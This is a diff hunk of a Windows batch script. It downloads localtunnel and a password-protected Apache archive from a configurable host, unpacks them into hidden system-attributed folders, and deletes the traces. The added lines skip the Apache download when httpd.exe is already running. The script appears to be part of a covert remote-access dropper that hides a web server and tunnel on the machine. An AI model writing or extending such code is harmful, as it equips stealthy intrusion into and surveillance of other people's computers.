@@ -43,7 +43,8 @@ attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunn
  "%environment%\curl.exe" -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del /s /f /q /a "%temp%\localtunnel.zip"
 )
 
-attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z")
+tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
+if not errorlevel 1 (echo) else (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z")
 
  attrib -s -h -i "%environment%\ffmpeg.exe" && if exist "%environment%\ffmpeg.eexe" (
     attrib +s +h +i "%environment%\ffmpeg.exe"
